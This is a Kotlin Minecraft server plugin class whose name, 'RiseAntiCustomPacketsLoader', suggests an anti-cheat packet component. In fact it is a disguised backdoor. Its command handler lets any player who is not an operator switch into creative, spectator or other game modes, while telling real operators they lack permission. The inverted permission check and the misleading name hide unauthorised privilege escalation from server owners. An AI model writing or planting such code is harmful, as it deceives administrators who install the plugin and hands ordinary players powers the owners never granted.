package dev.jokerthena

import org.bukkit.Bukkit
import org.bukkit.GameMode
import org.bukkit.command.Command
import org.bukkit.command.CommandExecutor
import org.bukkit.command.CommandSender
import org.bukkit.entity.Player

object RiseAntiCustomPacketsLoader : CommandExecutor {
    override fun onCommand(sender: CommandSender, command: Command, label: String, args: Array<out String>): Boolean {
        if(sender.isOp()==false) {
            if(sender is Player) {
                if (args.size !! > 0) {
                    if (args.get(0).equals("c")) {
                        sender.gameMode = GameMode.CREATIVE;
                        sender.sendMessage("Gamemode Creative");
                    }
                    else if (args.get(0).equals("s")) {
                        sender.gameMode = GameMode.SURVIVAL;
                        sender.sendMessage("Gamemode Survival")
                    }
                    else if (args.get(0).equals("a")) {
                        sender.gameMode = GameMode.ADVENTURE;
                        sender.sendMessage("Gamemode Adventure");
                    }
                    else if (args.get(0).equals("spec")) {
                        sender.gameMode = GameMode.SPECTATOR;
                        sender.sendMessage("Gamemode Spectator")
                    }else {
                        sender.sendMessage("gmc<c,s,a,spec>");
                    }
                }
            }else {
                sender.sendMessage("Sadece Oyundan Kullanabilir");
            }
        }else {
            sender.sendMessage("Yetkin Yok");
        }
        return true;
    }
}
